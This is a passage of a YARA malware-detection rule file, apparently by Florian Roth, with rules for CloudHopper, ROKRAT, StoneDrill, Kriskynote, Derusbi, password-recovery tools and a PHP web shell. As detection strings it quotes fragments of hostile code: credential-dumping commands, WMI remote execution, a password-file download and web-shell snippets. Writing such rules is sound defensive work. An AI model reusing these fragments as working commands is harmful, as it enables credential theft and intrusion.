$op0 = { 83 c4 34 c3 57 8b ce e8 92 18 00 00 68 20 70 40 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule OpCloudHopper_Malware_11_RID301E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:26:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a80f6c57f772f20d63021c8971a280c19e8eafe7cc7088344c598d84026dda15\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"IOGVWDWCXZVRHTE\" fullword ascii\n      $op1 = { c9 c3 56 6a 00 8b f1 6a 64 e8 dd 34 00 00 c7 06 } \n      $op2 = { 68 38 00 41 00 68 34 00 41 00 e8 d3 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule ROKRAT_Malware_RID2C0C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ROKRAT Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2017/04/introducing-rokrat.html\"\n      date = \"2017-04-03 09:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-09-14\"\n      hash1 = \"051463a14767c6477b6dacd639f30a8a5b9e126ff31532b58fc29c8364604d00\"\n      hash2 = \"cd166565ce09ef410c5bba40bad0b49441af6cfb48772e7e4a9de3d646b4851c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\users\\\\appdata\\\\local\\\\svchost.exe\" fullword ascii\n      $x2 = \"c:\\\\temp\\\\episode3.mp4\" fullword ascii\n      $x3 = \"MAC-SIL-TED-FOO-YIM-LAN-WAN-SEC-BIL-TAB\" ascii\n      $x4 = \"c:\\\\temp\\\\%d.tmp\" ascii fullword\n      $s1 = \"%s%s%04d%02d%02d%02d%02d%02d.jar\" fullword ascii\n      $s2 = \"\\\\Aboard\\\\Acm%c%c%c.exe\" ascii\n      $a1 = \"ython\" ascii fullword\n      $a2 = \"iddler\" ascii fullword\n      $a3 = \"egmon\" ascii fullword\n      $a6 = \"iresha\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25000KB and ( 1 of ( $x* ) or ( 5 of them ) )\n}\n\nrule Mimipenguin_SH_RID2C8D : DEMO HKTL LINUX SCRIPT T1003 {\n   meta:\n      description = \"Detects Mimipenguin Password Extractor - Linux\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-04-01 09:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, LINUX, SCRIPT, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$(echo $thishash | cut -d'$' -f 3)\" ascii\n      $s2 = \"ps -eo pid,command | sed -rn '/gnome\\\\-keyring\\\\-daemon/p' | awk\" ascii\n      $s3 = \"MimiPenguin Results:\" ascii\n   condition: \n      1 of them\n}\n\nrule Invoke_OSiRis_RID2C15 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Osiris Device Guard Bypass - file Invoke-OSiRis.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-27 09:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      hash1 = \"19e4a8b07f85c3d4c396d0c4e839495c9fba9405c06a631d57af588032d2416e\"\n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create -Arg $ObfusK -Computer $Target\" ascii wide\n      $x3 = \"-Arg@{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username}\" ascii wide\n      $x4 = \"Device Guard Bypass Command Execution\" ascii wide\n   condition: \n      filesize < 8MB and 1 of them\n}\n\nrule Malware_JS_powershell_obfuscated_RID33F9 : DEMO MAL OBFUS SCRIPT T1059_001 {\n   meta:\n      description = \"Unspecified malware - file rechnung_3.js\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-24 15:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3af15a2d60f946e0c4338c84bd39880652f676dc884057a96a10d7f802215760\"\n      tags = \"DEMO, MAL, OBFUS, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"po\\\" + \\\"wer\\\" + \\\"sh\\\" + \\\"e\\\" + \\\"ll\\\";\" fullword ascii\n   condition: \n      filesize < 30KB and 1 of them\n}\n\nrule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1059 T1059_001 {\n   meta:\n      description = \"Detects WMI implant- file WMImplant_RID2A8A.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html\"\n      date = \"2017-03-24 06:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"860d7c237c2395b4f51b8c9bd0ee6cab06af38fff60ce3563d160d50c11d2f78\"\n      tags = \"DEMO, SCRIPT, T1047, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-ProcessPunisher -Creds $RemoteCredential\" fullword ascii\n      $x2 = \"$Target -query \\\"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')\" ascii\n      $x3 = \"WMImplant_RID2A8A -Creds\" fullword ascii\n      $x4 = \"-Download -RemoteFile C:\\\\passwords.txt\" ascii\n      $x5 = \"-Command 'powershell.exe -command \\\"Enable-PSRemoting\" fullword ascii\n      $x6 = \"Invoke-WMImplant_RID2A8A\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule BeyondExec_RemoteAccess_Tool_RID3211 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects BeyondExec Remote Access Tool - file rexesvr.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/3d3e3f0708479d951ab72fa04ac63acc7e5a75a5723eb690b34301580747032c?environmentId=100\"\n      date = \"2017-03-17 13:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"3d3e3f0708479d951ab72fa04ac63acc7e5a75a5723eb690b34301580747032c\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\BeyondExecV2\\\\Server\\\\Release\\\\Pipes.pdb\" ascii\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\beyondexec%d-stdin\" fullword ascii\n      $x3 = \"Failed to create dispatch pipe. Do you have another instance running?\" fullword ascii\n      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } \n      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or all of ( $op* ) ) ) or ( 3 of them )\n}\n\nrule WPR_loader_EXE_RID2C21 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file loader.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 09:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e7d158d27d9c14a4f15a52ee5bf8aa411b35ad510b1b93f5e163ae7819c621e2\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failed to get system process ID\" fullword wide\n      $s2 = \"gLSASS.EXE\" fullword wide\n      $s3 = \"WriteProcessMemory failed\" fullword wide\n      $s4 = \"wow64 process NOT created\" fullword wide\n      $s5 = \"\\\\ast.exe\" wide\n      $s6 = \"Exit code=%s, status=%d\" fullword wide\n      $s7 = \"VirtualProtect failed\" fullword wide\n      $s8 = \"nSeDebugPrivilege\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them )\n}\n\nrule WPR_loader_DLL_RID2C1B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file loader64.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 09:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7b074cb99d45fc258e0324759ee970467e0f325e5d72c0b046c4142edc6776f6\"\n      hash2 = \"a1f27f7fd0e03601a11b66d17cfacb202eacf34f94de3c4e9d9d39ea8d1a2612\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"loader64.dll\" fullword ascii\n      $x2 = \"loader.dll\" fullword ascii\n      $s1 = \"TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==\" fullword ascii\n      $s2 = \"UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50\" fullword ascii\n      $s3 = \"U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz\" fullword ascii\n      $s4 = \"VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk\" fullword ascii\n      $s5 = \"TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=\" fullword ascii\n      $s6 = \"YXNwbmV0X1dQX1BBU1NXT1JE\" fullword ascii\n      $s7 = \"TCRBTk1fQ1JFREVOVElBTFM=\" fullword ascii\n      $s8 = \"RGVmYXVsdFBhc3N3b3Jk\" fullword ascii\n      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } \n      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } \n      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or ( 1 of ( $s* ) and all of ( $op* ) ) )\n}\n\nrule WPR_Passscape_Loader_RID2EC2 : DEMO EXE FILE HKTL T1543_003 {\n   meta:\n      description = \"Windows Password Recovery - file ast.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 11:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f6f2d4b9f19f9311ec419f05224a1c17cf2449f2027cb7738294479eea56e9cb\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\PasscapeLoader64\" fullword wide\n      $s2 = \"ast64.dll\" fullword ascii\n      $s3 = \"\\\\loader64.exe\" wide\n      $s4 = \"Passcape 64-bit Loader Service\" fullword wide\n      $s5 = \"PasscapeLoader64\" fullword wide\n      $s6 = \"ast64 {msg1GkjN7Sh8sg2Al7ker63f}\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule WPR_Asterisk_Hook_Library_RID30D3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file ast64.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 12:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"225071140e170a46da0e57ce51f0838f4be00c8f14e9922c6123bee4dffde743\"\n      hash2 = \"95ec84dc709af990073495082d30309c42d175c40bd65cad267e6f103852a02d\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ast64.dll\" fullword ascii\n      $s2 = \"ast.dll\" fullword wide\n      $s3 = \"c:\\\\%s.lvc\" fullword ascii\n      $s4 = \"c:\\\\%d.lvc\" fullword ascii\n      $s5 = \"Asterisk Hook Library\" fullword wide\n      $s6 = \"?Ast_StartRd64@@YAXXZ\" fullword ascii\n      $s7 = \"Global\\\\{1374821A-281B-9AF4-%04X-12345678901234}\" fullword ascii\n      $s8 = \"2004-2013 Passcape Software\" fullword wide\n      $s9 = \"Global\\\\Passcape#6712%04X\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}\n\nrule WPR_WindowsPasswordRecovery_EXE_RID3337 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file wpr.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 14:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c1c64cba5c8e14a1ab8e9dd28828d036581584e66ed111455d6b4737fb807783\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UuPipe\" fullword ascii\n      $x2 = \"dbadllgl\" fullword ascii\n      $x3 = \"UkVHSVNUUlkgTU9O\" fullword ascii\n      $x4 = \"RklMRSBNT05JVE9SIC0gU1l\" fullword ascii\n      $s1 = \"WPR.exe\" fullword wide\n      $s2 = \"Windows Password Recovery\" fullword wide\n      $op0 = { 5f df 27 17 89 } \n      $op1 = { 5f 00 00 f2 e5 cb 97 } \n      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and ( 1 of ( $x* ) or all of ( $s* ) or all of ( $op* ) )\n}\n\nrule WPR_WindowsPasswordRecovery_EXE_64_RID3400 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file ast64.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 15:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4e1ea81443b34248c092b35708b9a19e43a1ecbdefe4b5180d347a6c8638d055\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%B %d %Y  -  %H:%M:%S\" fullword wide\n      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } \n      $op1 = { ff 15 16 25 01 00 f7 d8 1b } \n      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule StoneDrill_BAT_1_RID2CD7 : APT DEMO FILE MIDDLE_EAST SCRIPT {\n   meta:\n      description = \"Rule to detect Batch file from StoneDrill report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 10:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, MIDDLE_EAST, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set u100=\" ascii\n      $s2 = \"set u200=service\" ascii fullword\n      $s3 = \"set u800=%~dp0\" ascii fullword\n      $s4 = \"\\\"%systemroot%\\\\system32\\\\%u100%\\\"\" ascii\n      $s5 = \"%\\\" start /b %systemroot%\\\\system32\\\\%\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68636540 and 2 of them and filesize < 500\n}\n\nrule StoneDrill_Service_Install_RID3177 : APT DEMO MIDDLE_EAST SCRIPT T1569_002 {\n   meta:\n      description = \"Rule to detect Batch file from StoneDrill report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 13:23:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, MIDDLE_EAST, SCRIPT, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"127.0.0.1 >nul && sc config\" ascii\n      $s2 = \"LocalService\\\" && ping -n\" ascii fullword\n      $s3 = \"127.0.0.1 >nul && sc start\" ascii fullword\n      $s4 = \"sc config NtsSrv binpath= \\\"C:\\\\WINDOWS\\\\system32\\ntssrvr64.exe\" ascii\n   condition: \n      2 of them and filesize < 500\n}\n\nrule StoneDrill_ntssrvr32_RID2EF7 : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 11:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      hash1 = \"394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"g\\\\system32\\\\\" wide\n      $s2 = \"ztvttw\" fullword wide\n      $s3 = \"lwizvm\" fullword ascii\n      $op1 = { 94 35 77 73 03 40 eb e9 } \n      $op2 = { 80 7c 41 01 00 74 0a 3d } \n      $op3 = { 74 0a 3d 00 94 35 77 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )\n}\n\nrule StoneDrill_Malware_2_RID2ECA : APT DEMO EXE MIDDLE_EAST T1047 {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db\"\n      tags = \"APT, DEMO, EXE, MIDDLE_EAST, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c WMIC Process Call Create \\\"C:\\\\Windows\\\\System32\\\\Wscript.exe //NOLOGO \" fullword wide\n      $s2 = \"C:\\\\ProgramData\\\\InternetExplorer\" fullword wide\n      $s3 = \"WshShell.CopyFile \\\"\" fullword wide\n      $s4 = \"Abd891.tmp\" fullword wide\n      $s5 = \"Set WshShell = Nothing\" fullword wide\n      $s6 = \"AaCcdDeFfGhiKLlMmnNoOpPrRsSTtUuVvwWxyZz32\" fullword ascii\n      $s7 = \"\\\\FileInfo.txt\" wide\n      $x1 = \"C-PDI-C-Cpy-T.vbs\" fullword wide\n      $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n      $x3 = \"C-PDC-C-Cpy-T.vbs\" fullword wide\n      $x4 = \"AC-PDC-C-Cpy-T.vbs\" fullword wide\n      $x5 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or 5 of them\n}\n\nrule StoneDrill_RID2B11 : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from StoneDrill_RID2B11 threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 08:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2bab3716a1f19879ca2e6d98c518debb107e0ed8e1534241f7769193807aac83\"\n      hash2 = \"62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260\"\n      hash3 = \"69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n      $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n      $s1 = \"Hello dear\" fullword ascii\n      $s2 = \"WRZRZRAR\" fullword ascii\n      $opa1 = { 66 89 45 d8 6a 64 ff } \n      $opa2 = { 8d 73 01 90 0f bf 51 fe } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or ( all of ( $op* ) and all of ( $s* ) )\n}\n\nrule StoneDrill_VBS_1_RID2CEB : APT DEMO MIDDLE_EAST SCRIPT {\n   meta:\n      description = \"Detects malware from StoneDrill threat report\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n      date = \"2017-03-07 10:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f4d608a87e36cb0dbf1b2d176ecfcde837070a2b2a049d532d3d4226e0c9587\"\n      tags = \"APT, DEMO, MIDDLE_EAST, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wmic /NameSpace:\\\\\\\\root\\\\default Class StdRegProv Call SetStringValue hDefKey = \\\"&H80000001\\\" sSubKeyName = \\\"Software\\\\Micros\" ascii\n      $x2 = \"ping 1.0.0.0 -n 1 -w 20000 > nul\" fullword ascii\n      $s1 = \"WshShell.CopyFile \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n      $s2 = \"WshShell.DeleteFile \\\"%temp%\\\\\" ascii\n      $s3 = \"WScript.Sleep(10 * 1000)\" fullword ascii\n      $s4 = \"Set WshShell = CreateObject(\\\"Scripting.FileSystemObject\\\") While WshShell.FileExists(\\\"\" ascii\n      $s5 = \" , \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n   condition: \n      ( filesize < 1KB and 1 of ( $x* ) or 2 of ( $s* ) )\n}\n\nrule Derusbi_Backdoor_Mar17_1_RID2FDA : DEMO EXE FILE MAL T1218_011 {\n   meta:\n      description = \"Detects a variant of the Derusbi backdoor\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 12:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f87915f21dcc527981ebb6db3d332b5b341129b4af83524f59d7178e9d2a3a32\"\n      tags = \"DEMO, EXE, FILE, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n      $x2 = \"c%WINDIR%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\pchsvc.dll\" fullword wide\n      $x3 = \"%Systemroot%\\\\Help\\\\perfc009.dat\" fullword wide\n      $x4 = \"rundll32.exe \\\"%s\\\", R32 %s\" fullword wide\n      $x5 = \"OfficeUt32.dll\" fullword ascii\n      $x6 = \"\\\\\\\\.\\\\pipe\\\\usb%so\" fullword wide\n      $x7 = \"\\\\\\\\.\\\\pipe\\\\usb%si\" fullword wide\n      $x8 = \"\\\\tmp1.dat\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}\n\nrule Kriskynote_Mar17_1_RID2DBB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a19c4b615aa54207604b181873e614d84126b639fee2cce3ca9d5bd863f6f577\"\n      hash2 = \"62b41db0bf63fa45a2c2b0f5df8c2209a5d96bf2bddf82749595c66d30b7ec61\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"gzwrite64\" fullword ascii\n      $opa1 = { e8 6b fd ff ff 83 f8 ff 74 65 83 7b 28 00 74 42 } \n      $opb1 = { 8a 04 08 8b 8e a4 16 00 00 88 44 24 0c 66 c7 04 } \n      $opb2 = { 89 4e 6c 89 46 74 e9 ad fc ff ff 8b 46 68 85 c0 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and ( $opa1 or all of ( $opb* ) )\n}\n\nrule Kriskynote_Mar17_2_RID2DBC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cb9a2f77868b28d98e4f9c1b27b7242fec2f2abbc91bfc21fe0573e472c5dfcb\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fgjfcn8456fgjhfg89653wetwts\" fullword ascii\n      $op0 = { 33 c0 80 34 30 03 40 3d e6 21 00 00 72 f4 b8 e6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}\n\nrule Kriskynote_Mar17_3_RID2DBD : DEMO EXE FILE MAL T1218_011 {\n   meta:\n      description = \"Detects Kriskynote Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-03 10:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc838e07834994f25b3b271611e1014b3593278f0703a4a985fb4234936df492\"\n      tags = \"DEMO, EXE, FILE, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"rundll32 %s Check\" fullword ascii\n      $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RecentDocs\" fullword ascii\n      $s3 = \"name=\\\"IsUserAdmin\\\"\" fullword ascii\n      $s4 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}\n\nrule PHP_Webshell_1_Feb17_RID2DF2 : ANOMALY DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a simple cloaked PHP web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127\"\n      date = \"2017-02-28 10:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?php ${\\\"\\\\x\" ascii\n      $x1 = \"\\\";global$auth;function sh_decrypt_phase($data,$key){${\\\"\" ascii\n      $x2 = \"global$auth;return sh_decrypt_phase(sh_decrypt_phase($\" ascii\n      $x3 = \"]}[\\\"\\x64\\\"]);}}echo \" ascii\n      $x4 = \"\\\"=>@phpversion(),\\\"\\\\x\" ascii\n      $s1 = \"$i=Array(\\\"pv\\\"=>@phpversion(),\\\"sv\\\"\" ascii\n      $s3 = \"$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them\n}\n\nrule WordDoc_PowerShell_URLDownloadToFile_RID34F4 : DEMO FILE MAL OFFICE SCRIPT T1059_001 {\n   meta:\n      description = \"Detects Word Document with PowerShell URLDownloadToFile\"\n      author = \"Florian Roth\"\n      reference = \"https://www.arbornetworks.com/blog/asert/additional-insights-shamoon2/\"\n      date = \"2017-02-23 15:52:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e\"\n      hash2 = \"388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d\"\n      hash3 = \"71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087\"\n      tags = 